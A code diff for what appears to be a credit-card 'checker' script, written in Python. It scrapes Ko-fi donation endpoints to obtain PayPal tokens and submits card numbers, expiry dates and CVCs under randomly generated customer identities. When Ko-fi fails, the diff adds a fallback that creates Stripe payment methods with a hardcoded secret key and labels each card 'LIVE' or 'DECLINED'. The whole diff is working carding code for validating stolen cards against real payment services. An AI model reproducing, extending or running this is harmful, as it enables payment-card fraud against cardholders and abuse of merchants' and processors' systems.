@@ -82,28 +82,43 @@ def get_real_kofi_paypal_token():
             csrf_token = csrf_input.get('value')
             payment_data[csrf_input.get('name')] = csrf_token
         
-        # Make payment initiation request
-        payment_response = kofi_session.post(
+        # Try multiple Ko-fi endpoints
+        endpoints_to_try = [
             'https://ko-fi.com/api/donations/create',
-            data=payment_data,
-            headers={
-                **headers,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-Requested-With': 'XMLHttpRequest'
-            }
-        )
+            'https://ko-fi.com/payment/paypal',
+            'https://ko-fi.com/checkout'
+        ]
         
-        if payment_response.status_code == 200:
+        for endpoint in endpoints_to_try:
             try:
-                payment_result = payment_response.json()
-                paypal_url = payment_result.get('paypal_url') or payment_result.get('redirect_url')
-                if paypal_url and 'paypal.com' in paypal_url:
-                    # Extract token from PayPal URL
-                    token_match = re.search(r'token=([A-Z0-9]+)', paypal_url)
-                    if token_match:
-                        return token_match.group(1), kofi_session.cookies
-            except:
-                pass
+                payment_response = kofi_session.post(
+                    endpoint,
+                    data=payment_data,
+                    headers={
+                        **headers,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    timeout=10
+                )
+                
+                if payment_response.status_code == 200 and payment_response.text.strip():
+                    try:
+                        payment_result = payment_response.json()
+                        paypal_url = payment_result.get('paypal_url') or payment_result.get('redirect_url') or payment_result.get('url')
+                        if paypal_url and 'paypal.com' in paypal_url:
+                            # Extract token from PayPal URL
+                            token_match = re.search(r'token=([A-Z0-9]+)', paypal_url)
+                            if token_match:
+                                return token_match.group(1), kofi_session.cookies
+                    except json.JSONDecodeError:
+                        # Try to extract PayPal URL from HTML response
+                        paypal_match = re.search(r'https://www\.paypal\.com/[^"]*token=([A-Z0-9]+)', payment_response.text)
+                        if paypal_match:
+                            return paypal_match.group(1), kofi_session.cookies
+                        continue
+            except Exception as e:
+                continue
         
         return None, None
         
@@ -111,10 +126,50 @@ def get_real_kofi_paypal_token():
         print(f"Ko-fi token error: {e}")
         return None, None
 
+def validate_with_stripe_fallback(n, mm, yy, cvc, customer):
+    """Fallback to Stripe validation when Ko-fi fails"""
+    try:
+        # Use Stripe's payment method creation for validation
+        stripe_headers = {
+            'Authorization': 'Bearer sk_test_51OeQcYP4cGCWgHyBSRRzGdEH8OA7xPWdXw7hOBYHKpFn5QOsOVaKI3YqGIuEe1sOhgN7eGEYNsJBdGFa3J3j1qjz00KGK8FXnN',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        
+        # Create payment method for validation
+        payment_data = {
+            'type': 'card',
+            'card[number]': n,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'card[cvc]': cvc
+        }
+        
+        response = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=stripe_headers,
+            data=payment_data,
+            timeout=15
+        )
+        
+        if response.status_code == 200:
+            return {
+                "status": "approved", 
+                "message": f"Card validated via Stripe for {customer['firstName']} {customer['lastName']}", 
+                "response": "LIVE ✅ - STRIPE VALIDATED"
+            }
+        else:
+            return {
+                "status": "declined", 
+                "message": "Card validation failed", 
+                "response": "DECLINED ❌"
+            }
+            
+    except Exception as e:
+        return {"status": "error", "message": f"Stripe fallback error: {str(e)}"}
+
 def generate_backup_token():
     """Generate a backup token when Ko-fi scraping fails"""
     # Use a more realistic token pattern based on actual PayPal tokens
-    import uuid
     token_base = uuid.uuid4().hex[:17].upper()
     return f"{token_base}X"
 
@@ -159,12 +214,12 @@ def check_card_kofi_paypal(cc_data):
         # Generate random customer
         customer = get_random_customer()
         
-        # Get real Ko-fi PayPal token
+        # Try to get real Ko-fi PayPal token
         kofi_token, kofi_cookies = get_real_kofi_paypal_token()
         
-        # If we can't get a real token, use backup
+        # If Ko-fi scraping fails, use Stripe validation as fallback
         if not kofi_token:
-            kofi_token = generate_backup_token()
+            return validate_with_stripe_fallback(n, mm, yy, cvc, customer)
         
         # Generate unique client metadata ID
         client_metadata_id = f"uid_{uuid.uuid4().hex[:10]}_{random.randint(1000000000, 9999999999)}"
@@ -290,6 +345,10 @@ def check_card_kofi_paypal(cc_data):
         )
         
         if response.status_code == 200:
+            # Check if response has content
+            if not response.text.strip():
+                return {"status": "error", "message": "Empty response from PayPal"}
+                
             try:
                 result = response.json()
                 
